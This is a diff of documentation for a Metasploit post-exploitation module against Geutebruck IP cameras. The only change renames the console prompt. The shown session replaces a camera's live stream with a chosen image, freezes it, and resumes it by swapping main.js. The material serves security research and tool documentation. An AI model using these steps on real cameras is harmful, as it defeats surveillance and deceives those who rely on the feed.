@@ -69,8 +69,8 @@ blogpost page at https://www.randorisec.fr/udp-technology-ip-camera-vulnerabilit
 ## Scenarios
 ### Geutebruck 5.02024 G-Cam EFD-2250 running firmware version 1.12.0.27.
 ```
-msf6 > use post/linux/manage/geutebruck_post_exp
-msf6 post(linux/manage/geutebruck_post_exp) > show options
+msf > use post/linux/manage/geutebruck_post_exp
+msf post(linux/manage/geutebruck_post_exp) > show options
 
 Module options (post/linux/manage/geutebruck_post_exp):
 
@@ -87,7 +87,7 @@ Post action:
    FREEZE_CAMERA  Freeze the camera and display the last image taken from the video stream
 
 
-msf6 post(linux/manage/geutebruck_post_exp) > show actions
+msf post(linux/manage/geutebruck_post_exp) > show actions
 
 Post actions:
 
@@ -97,13 +97,13 @@ Post actions:
    FREEZE_CAMERA  Freeze the camera and display the last image taken from the video stream
    RESUME_STREAM  Resume the camera's video stream and display the current live feed
 
-msf6 post(linux/manage/geutebruck_post_exp) > set IMAGE /var/randori.jpg
+msf post(linux/manage/geutebruck_post_exp) > set IMAGE /var/randori.jpg
 IMAGE => /var/randori.jpg
-msf6 post(linux/manage/geutebruck_post_exp) > set action CHANGE_IMAGE
+msf post(linux/manage/geutebruck_post_exp) > set action CHANGE_IMAGE
 action => CHANGE_IMAGE
-msf6 post(linux/manage/geutebruck_post_exp) > set session 1
+msf post(linux/manage/geutebruck_post_exp) > set session 1
 session => 1
-msf6 post(linux/manage/geutebruck_post_exp) > run
+msf post(linux/manage/geutebruck_post_exp) > run
 
 [!] SESSION may not be compatible with this module.
 [*] -- Starting action --
@@ -112,9 +112,9 @@ msf6 post(linux/manage/geutebruck_post_exp) > run
 [*] Using the new main.js...
 [*] Done! The stream should be replaced by your image!
 [*] Post module execution completed
-msf6 post(linux/manage/geutebruck_post_exp) > set action FREEZE_CAMERA
+msf post(linux/manage/geutebruck_post_exp) > set action FREEZE_CAMERA
 action => FREEZE_CAMERA
-msf6 post(linux/manage/geutebruck_post_exp) > run
+msf post(linux/manage/geutebruck_post_exp) > run
 
 [!] SESSION may not be compatible with this module.
 [*] -- Starting action --
@@ -124,9 +124,9 @@ msf6 post(linux/manage/geutebruck_post_exp) > run
 [*] Using the new main.js...
 [*] Stream frozen!
 [*] Post module execution completed
-msf6 post(linux/manage/geutebruck_post_exp) > set action RESUME_STREAM
+msf post(linux/manage/geutebruck_post_exp) > set action RESUME_STREAM
 action => RESUME_STREAM
-msf6 post(linux/manage/geutebruck_post_exp) > run
+msf post(linux/manage/geutebruck_post_exp) > run
 
 [!] SESSION may not be compatible with this module.
 [*] -- Starting action --
